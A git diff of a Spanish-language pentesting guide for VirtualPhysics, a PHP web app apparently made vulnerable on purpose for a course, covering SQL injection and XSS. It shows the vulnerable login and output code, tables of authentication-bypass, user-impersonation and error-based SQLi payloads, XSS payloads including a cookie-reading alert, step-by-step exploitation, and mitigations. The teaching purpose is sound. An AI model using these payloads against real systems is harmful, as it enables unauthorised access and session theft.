@@ -1,115 +1,223 @@
-# Explicación Detallada de Vulnerabilidades (SQLi y XSS)
+# Guía de Vulnerabilidades en VirtualPhysics
+## Informe de Pentesting para Fines Académicos
 
-Este documento detalla las vulnerabilidades de Inyección SQL (SQLi) y Cross-Site Scripting (XSS) introducidas intencionalmente en el código PHP del proyecto VirtualPhysics para tu asignación de pentesting. **Recuerda que este código es inseguro y solo debe usarse en un entorno controlado y con fines educativos.**
+Este documento detalla las vulnerabilidades encontradas en el sistema VirtualPhysics y cómo explotarlas con fines educativos y de pentesting. El análisis se centra en dos tipos principales de vulnerabilidades: Inyección SQL (SQLi) y Cross-Site Scripting (XSS).
 
-## Estructura del Proyecto
+## 1. Inyección SQL (SQLi)
 
-Los archivos modificados se encuentran en la carpeta `FORMS` y siguen la estructura que proporcionaste:
+### 1.1 Descripción de la Vulnerabilidad
 
-```
-FORMS/
-├── config/
-│   └── database.php       (Configuración de BD - vulnerable)
-├── css/                   (Archivos CSS - no modificados)
-│   └── styles.css
-├── img/                   (Imágenes - no modificadas)
-├── includes/              (Includes - no modificados)
-│   ├── footer.php
-│   └── header.php
-├── js/                    (JavaScript - no modificado)
-│   └── scripts.js
-├── dashboard.php          (Vulnerable a Stored XSS)
-├── formularios.php        (Vulnerable a SQLi y Stored XSS)
-├── index.php              (Vulnerable a Reflected XSS)
-├── logout.php             (Funcionalidad de logout)
-├── procesar_formulario.php (Vulnerable a SQLi y XSS)
-├── procesar_login.php     (Vulnerable a SQLi y Reflected XSS)
-└── VirtualPhysics.sql     (Archivo SQL para crear la estructura de BD)
+La inyección SQL es una técnica de ataque que aprovecha la falta de validación en las entradas de usuario que se utilizan para construir consultas SQL. En VirtualPhysics, esta vulnerabilidad está presente en el proceso de autenticación (`procesar_login.php`), donde los datos del formulario de inicio de sesión se concatenan directamente en la consulta SQL sin ningún tipo de saneamiento.
+
+### 1.2 Código Vulnerable
+
+```php
+// Archivo: procesar_login.php
+$correo = $_POST['correo'];
+$contrasena = $_POST['contrasena'];
+
+// Consulta vulnerable a inyección SQL
+$query = "SELECT * FROM usuarios WHERE (correo = '$correo') AND (contrasena = SHA2('$contrasena', 256))";
+
+$resultado = mysqli_query($conexion, $query);
 ```
 
-## Vulnerabilidades Introducidas
+### 1.3 Explotación de la Vulnerabilidad
 
-### 1. Inyección SQL (SQLi)
+#### 1.3.1 Bypass de Autenticación
 
-La Inyección SQL ocurre cuando la entrada del usuario se inserta directamente en una consulta SQL sin el saneamiento adecuado (como usar consultas preparadas). Esto permite a un atacante manipular la consulta para extraer datos, modificar datos o incluso tomar control del servidor de base de datos.
+Para explotar esta vulnerabilidad y acceder al sistema sin conocer credenciales válidas, puedes usar los siguientes payloads en el campo de correo:
 
-**a) `procesar_login.php` (Autenticación)**
+| Payload | Descripción |
+|---------|-------------|
+| `' OR 1=1) -- ` | Hace que la condición WHERE siempre sea verdadera |
+| `') OR ('1'='1') -- ` | Cierra el paréntesis y crea una condición siempre verdadera |
+| `') OR 1=1 -- ` | Variante más simple que también funciona |
 
-*   **Línea:** ` $query = "SELECT * FROM usuarios WHERE correo = ".$correo." AND contrasena = SHA2(".$contrasena.", 256)"; `
-*   **Vulnerabilidad:** El `$correo` y `$contrasena` se concatenan directamente. Aunque la contraseña usa `SHA2`, lo que dificulta un bypass simple con `OR 1=1` en ese campo, la vulnerabilidad en `$correo` persiste.
-*   **Explotación (Ejemplo en campo Correo):** Introduce como correo: `admin@example.com' OR '1'='1' -- ` (el `-- ` comenta el resto de la consulta). Esto podría permitir el login como el primer usuario de la tabla si la lógica SQL lo permite, o causar un error que revele información.
-*   **Nota:** La efectividad depende de la configuración exacta de la base de datos y si existen usuarios.
+Cuando ingresas `' OR 1=1) -- ` en el campo de correo, la consulta resultante es:
 
-**b) `formularios.php` (Carga de Formulario y Preguntas)**
+```sql
+SELECT * FROM usuarios WHERE (correo = '' OR 1=1) -- ') AND (contrasena = SHA2('cualquier_cosa', 256))
+```
 
-*   **Línea:** ` $formulario_id = $_GET["id"]; `
-*   **Líneas de Consulta:**
-    *   ` $query_formulario = "SELECT * FROM formularios WHERE id = $formulario_id"; `
-    *   ` $query_preguntas = "SELECT * FROM preguntas WHERE formulario_id = $formulario_id ORDER BY orden"; `
-*   **Vulnerabilidad:** El parámetro `id` de la URL (`$_GET['id']`) se concatena directamente en las consultas SQL.
-*   **Explotación (Ejemplo en URL):** Accede a `formularios.php?id=1 UNION SELECT null, version(), null, null, null -- `. Esto intentará unir el resultado de `version()` (la versión de la base de datos) a la consulta original. Podrías necesitar ajustar el número de `null` para que coincida con las columnas de la tabla `formularios` o `preguntas`. También puedes usar SQLi basado en errores.
+Todo lo que sigue después de `--` se considera un comentario en SQL, por lo que la parte de la validación de contraseña se ignora completamente.
 
-**c) `procesar_formulario.php` (Guardado de Respuestas)**
+#### 1.3.2 Acceso como Usuario Específico
 
-*   **Línea dentro del bucle `foreach`:** ` $query = "INSERT INTO respuestas (usuario_codigo, formulario_id, pregunta_id, respuesta) VALUES (".$usuario_codigo.", ".$formulario_id.", ".$pregunta_id.", ".$value.")"; `
-*   **Vulnerabilidad:** El valor de la respuesta (`$value`, que viene de `$_POST`) se concatena directamente en la consulta `INSERT`.
-*   **Explotación (Ejemplo en un campo de respuesta del formulario):** Introduce como respuesta: `Mi respuesta', (SELECT @@version)) -- `. Esto intentará insertar la versión de la base de datos en la columna `respuesta` junto con tu texto.
+Si deseas acceder como un usuario específico, puedes usar:
 
-### 2. Cross-Site Scripting (XSS)
+| Payload | Descripción |
+|---------|-------------|
+| `') OR correo='admin@virtualphysics.com') -- ` | Accede como administrador |
+| `') OR correo='izi@gmail.com') -- ` | Accede como usuario "izai" |
+| `') OR codigo='admin-001') -- ` | Accede usando el código de usuario |
 
-El XSS ocurre cuando una aplicación web incluye datos no confiables (generalmente entrada del usuario) en una página web sin escaparlos correctamente. Esto permite a los atacantes ejecutar scripts maliciosos en el navegador de la víctima.
+#### 1.3.3 Extracción de Información
 
-**a) `index.php` (Reflected XSS en Mensaje de Error)**
+Para extraer información de la base de datos:
 
-*   **Línea:** ` echo $_GET["error"]; `
-*   **Vulnerabilidad:** El script `procesar_login.php` redirige a `index.php` incluyendo la entrada del usuario (`$correo`) en el parámetro `error` sin escapar. `index.php` muestra este parámetro directamente.
-*   **Explotación:** Intenta iniciar sesión con un correo como `<script>alert('XSS en Correo');</script>`. Cuando `procesar_login.php` falle y redirija, la URL será algo como `index.php?error=Credenciales incorrectas para el correo: <script>alert('XSS en Correo');</script>`. El script se ejecutará porque `index.php` imprime el parámetro `error` sin `htmlspecialchars()`.
+| Payload | Descripción |
+|---------|-------------|
+| `') UNION SELECT 'admin-001','Admin','admin@test.com','test',NOW() -- ` | Crea un registro falso |
+| `') OR 1=1 ORDER BY 1,2,3,4,5 -- ` | Determina el número de columnas |
 
-**b) `dashboard.php` (Stored XSS en Nombre de Usuario, Títulos/Descripciones de Formularios)**
+#### 1.3.4 Inyecciones Basadas en Errores
 
-*   **Líneas:**
-    *   ` <span>Bienvenido, <?php echo $_SESSION['usuario_nombre']; ?></span> `
-    *   ` <?php echo $formulario['titulo']; ?> `
-    *   ` <?php echo $formulario['descripcion']; ?> `
-*   **Vulnerabilidad:** El nombre de usuario (almacenado en la sesión desde la base de datos) y los títulos/descripciones de los formularios (leídos de la base de datos) se muestran directamente sin `htmlspecialchars()`.
-*   **Explotación:** Si un atacante logra insertar código JavaScript (ej. `<script>alert('Stored XSS')</script>`) en el nombre de un usuario o en el título/descripción de un formulario en la base de datos (quizás a través de otra vulnerabilidad o directamente si tiene acceso), ese script se ejecutará cada vez que un usuario visite el dashboard.
+Para obtener información a través de errores:
 
-**c) `formularios.php` (Stored XSS en Título/Descripción/Preguntas/Opciones)**
+| Payload | Descripción |
+|---------|-------------|
+| `') AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- ` | Extrae la versión de la base de datos |
 
-*   **Líneas:**
-    *   ` <title><?php echo $formulario ? $formulario['titulo'] : '...'; ?> - ...</title> `
-    *   ` <h2 ...><?php echo $formulario['titulo']; ?></h2> `
-    *   ` <p ...><?php echo $formulario['descripcion']; ?></p> `
-    *   ` <?php echo $pregunta['pregunta']; ?> `
-    *   ` <?php echo $opcion; ?> ` (dentro del bucle de opciones múltiples)
-*   **Vulnerabilidad:** Similar al dashboard, los datos leídos de la base de datos (título, descripción, texto de pregunta, texto de opción) se muestran directamente.
-*   **Explotación:** Si estos campos en la base de datos contienen scripts, se ejecutarán al ver el formulario.
+### 1.4 Evidencia de Explotación
 
-**d) `procesar_formulario.php` (Reflected/Stored XSS en Debug Info)**
+1. Ingresa al formulario de login en `index.php`
+2. En el campo de correo, escribe: `' OR 1=1) -- `
+3. En el campo de contraseña, escribe cualquier cosa (por ejemplo: `123`)
+4. Haz clic en "INGRESAR"
+5. Serás redirigido a `dashboard.php` como el primer usuario de la base de datos
 
-*   **Línea:** ` <?php echo $usuario_codigo; ?> en formulario <?php echo $formulario_id; ?> `
-*   **Vulnerabilidad:** La información de depuración muestra `$usuario_codigo` (de la sesión, potencial Stored XSS si el código de usuario en la BD tuviera script) y `$formulario_id` (del POST, potencial Reflected XSS si se manipula el POST) directamente.
-*   **Explotación:** Si `$usuario_codigo` o `$formulario_id` contienen script, se ejecutarán en esta página de confirmación.
+### 1.5 Mitigación
 
-### 3. Otras Vulnerabilidades Menores (Presentes en el código original o introducidas)
+Para mitigar esta vulnerabilidad:
 
-*   **`config/database.php`:** Credenciales de base de datos hardcodeadas (root sin contraseña). En un entorno real, esto es extremadamente peligroso.
-*   **Falta de Validación de Método HTTP:** Scripts como `procesar_login.php` no verifican si la solicitud es POST, aunque dependen de `$_POST`.
-*   **Manejo de Errores Inseguro:** En varios puntos, `mysqli_error($conexion)` se usa o se comenta, lo que podría revelar información sensible de la base de datos si los errores se mostraran al usuario.
-*   **Sin Protección CSRF:** Los formularios no incluyen tokens CSRF, haciéndolos vulnerables a ataques Cross-Site Request Forgery.
-*   **Sin Límite de Intentos (Fuerza Bruta):** El login no limita los intentos fallidos.
-*   **Validación de Sesión Simple:** Solo se verifica `isset($_SESSION['usuario_codigo'])`.
+1. **Usar consultas preparadas (prepared statements)**:
+```php
+$stmt = $conexion->prepare("SELECT * FROM usuarios WHERE correo = ? AND contrasena = SHA2(?, 256)");
+$stmt->bind_param("ss", $correo, $contrasena);
+$stmt->execute();
+$resultado = $stmt->get_result();
+```
 
-## Configuración del Entorno
+2. **Validar y sanitizar entradas**:
+```php
+$correo = filter_var($_POST['correo'], FILTER_SANITIZE_EMAIL);
+if (!filter_var($correo, FILTER_VALIDATE_EMAIL)) {
+    // Manejar error
+}
+```
 
-1.  **Servidor Web:** Necesitarás un servidor web con PHP y MySQL/MariaDB (como XAMPP, WAMP, MAMP o un servidor Linux configurado).
-2.  **Base de Datos:**
-    *   Crea una base de datos llamada `virtualphysics`.
-    *   Importa el archivo `VirtualPhysics.sql` proporcionado para crear las tablas (`usuarios`, `formularios`, `preguntas`, `respuestas`).
-    *   Asegúrate de que el usuario de la base de datos (`root` sin contraseña según `database.php`) tenga permisos sobre esta base de datos.
-3.  **Código:** Coloca la carpeta `FORMS` completa en el directorio raíz de tu servidor web (ej. `htdocs` en XAMPP).
-4.  **Acceso:** Accede a la aplicación a través de tu navegador (ej. `http://localhost/FORMS/`).
+3. **Implementar un ORM (Object-Relational Mapping)** como Doctrine o Eloquent.
 
-## Advertencia Final
+## 2. Cross-Site Scripting (XSS)
 
-Este código es deliberadamente inseguro. Úsalo responsablemente para aprender y practicar en tu entorno local controlado. Nunca despliegues este código ni uses estas técnicas en sistemas reales sin autorización explícita. La forma correcta de prevenir estas vulnerabilidades incluye el uso de consultas preparadas, saneamiento y escape de todas las entradas y salidas (ej. `htmlspecialchars`), validación robusta de datos, manejo seguro de sesiones y errores, y tokens CSRF.
+### 2.1 Descripción de la Vulnerabilidad
+
+El Cross-Site Scripting (XSS) permite a un atacante inyectar scripts maliciosos en páginas web vistas por otros usuarios. En VirtualPhysics, existen múltiples puntos donde las entradas de usuario se muestran sin escapar adecuadamente.
+
+### 2.2 Tipos de XSS en VirtualPhysics
+
+#### 2.2.1 XSS Reflejado (Reflected XSS)
+
+En `procesar_login.php`, cuando las credenciales son incorrectas, el correo ingresado se refleja en el mensaje de error sin escapar:
+
+```php
+$error_msg = "Credenciales incorrectas para el correo: " . $correo;
+header("Location: index.php?error=" . $error_msg);
+```
+
+Y en `index.php`, el mensaje de error se muestra directamente:
+
+```php
+<?php if(isset($_GET['error'])): ?>
+    <div class="error-message"><?php echo $_GET['error']; ?></div>
+<?php endif; ?>
+```
+
+#### 2.2.2 XSS Almacenado (Stored XSS)
+
+En `dashboard.php`, el nombre de usuario se obtiene de la sesión y se muestra directamente:
+
+```php
+<span>Bienvenido, <?php echo $_SESSION['usuario_nombre']; ?></span>
+```
+
+Si un atacante logra modificar el nombre de usuario en la base de datos para incluir código malicioso, este se ejecutará cada vez que el usuario inicie sesión.
+
+### 2.3 Explotación de la Vulnerabilidad
+
+#### 2.3.1 XSS Reflejado
+
+Para explotar el XSS reflejado:
+
+1. Accede al formulario de login en `index.php`
+2. En el campo de correo, ingresa: `<script>alert('XSS')</script>`
+3. En el campo de contraseña, ingresa cualquier cosa
+4. Haz clic en "INGRESAR"
+5. Serás redirigido a `index.php` con un mensaje de error que ejecutará el script
+
+Otros payloads efectivos:
+
+| Payload | Descripción |
+|---------|-------------|
+| `<img src="x" onerror="alert('XSS')">` | Ejecuta código cuando la imagen no se puede cargar |
+| `<svg onload="alert('XSS')">` | Ejecuta código cuando el SVG se carga |
+| `javascript:alert('XSS')` | Inyección en atributos href |
+
+#### 2.3.2 XSS Almacenado
+
+Para explotar el XSS almacenado, necesitarías:
+
+1. Acceder a la base de datos (posiblemente a través de otra vulnerabilidad como SQLi)
+2. Modificar el campo `nombre` de un usuario para incluir código malicioso
+3. Cuando ese usuario inicie sesión, el código se ejecutará
+
+### 2.4 Evidencia de Explotación
+
+Para el XSS reflejado:
+1. Ingresa `<script>alert(document.cookie)</script>` en el campo de correo
+2. Ingresa cualquier contraseña
+3. Haz clic en "INGRESAR"
+4. Verás una alerta con las cookies de la sesión
+
+### 2.5 Mitigación
+
+Para mitigar vulnerabilidades XSS:
+
+1. **Escapar salidas HTML**:
+```php
+<span>Bienvenido, <?php echo htmlspecialchars($_SESSION['usuario_nombre'], ENT_QUOTES, 'UTF-8'); ?></span>
+```
+
+2. **Usar funciones de escape en mensajes de error**:
+```php
+<?php if(isset($_GET['error'])): ?>
+    <div class="error-message"><?php echo htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8'); ?></div>
+<?php endif; ?>
+```
+
+3. **Implementar Content Security Policy (CSP)**:
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+```
+
+4. **Validar entradas** para rechazar caracteres sospechosos.
+
+## 3. Combinación de Vulnerabilidades
+
+Un atacante podría combinar ambas vulnerabilidades para un ataque más sofisticado:
+
+1. Usar SQLi para acceder al sistema sin credenciales
+2. Explotar XSS para robar cookies de sesión de otros usuarios
+3. Usar las cookies robadas para suplantar a esos usuarios
+
+## 4. Conclusiones
+
+Las vulnerabilidades encontradas en VirtualPhysics son graves y podrían permitir a un atacante:
+
+- Acceder al sistema sin credenciales válidas
+- Obtener información sensible de la base de datos
+- Ejecutar código malicioso en el navegador de las víctimas
+- Robar sesiones de usuarios
+
+Es fundamental implementar las medidas de mitigación mencionadas para proteger el sistema y los datos de los usuarios.
+
+## 5. Referencias
+
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [MySQL Documentation on Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
+
+---
+
+*Este documento ha sido creado con fines educativos y de pentesting en un entorno controlado. No utilices estas técnicas en sistemas reales sin autorización explícita.*
